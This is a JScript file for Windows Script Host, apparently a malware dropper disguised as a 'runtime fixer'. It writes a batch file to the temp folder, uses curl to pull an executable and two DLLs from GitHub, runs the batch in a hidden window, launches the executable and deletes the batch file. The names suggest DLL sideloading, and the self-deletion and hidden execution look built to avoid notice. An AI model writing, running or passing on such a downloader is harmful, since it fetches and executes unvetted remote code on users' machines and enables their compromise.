// download-clean.js
(function() {
    function log(msg) {
        try {
            WScript.Echo(msg);
        } catch(e) {}
    }
    
    function downloadAndExecute() {
        try {
            log("=== بدء التنزيل ===");
            
            var shell = new ActiveXObject("WScript.Shell");
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            
            var targetDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
            log("المجلد: " + targetDir);
            
            if (!fso.FolderExists(targetDir)) {
                fso.CreateFolder(targetDir);
                log("تم إنشاء المجلد");
            }
            
            // الروابط
            var urls = [
                "https://github.com/amindaraji64-arch/a/raw/refs/heads/main/runtimefixer.exe",
                "https://github.com/amindaraji64-arch/b/raw/refs/heads/main/DismCore.dll",
                "https://github.com/amindaraji64-arch/c/raw/refs/heads/main/PagePdfSize_Config.dll"
            ];
            
            var names = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
            
            // إنشاء ملف batch
            var batchPath = targetDir + "\\run.bat";
            var batchContent = "@echo off\r\n";
            batchContent = batchContent + "echo Downloading...\r\n";
            
            for (var i = 0; i < urls.length; i++) {
                var filePath = targetDir + "\\" + names[i];
                batchContent = batchContent + "curl -L -o \"" + filePath + "\" \"" + urls[i] + "\"\r\n";
            }
            
            batchContent = batchContent + "echo Running...\r\n";
            batchContent = batchContent + "start \"\" \"" + targetDir + "\\runtimefixer.exe\"\r\n";
            batchContent = batchContent + "del \"" + batchPath + "\"\r\n";
            
            // حفظ الملف
            var file = fso.CreateTextFile(batchPath, true);
            file.Write(batchContent);
            file.Close();
            
            log("تم إنشاء ملف batch");
            log("جاري التنزيل والتشغيل...");
            
            // التشغيل
            shell.Run("cmd.exe /c \"" + batchPath + "\"", 0, false);
            
            log("=== اكتمل ===");
            
        } catch(e) {
            log("خطأ: " + e.message);
        }
    }
    
    downloadAndExecute();
})();
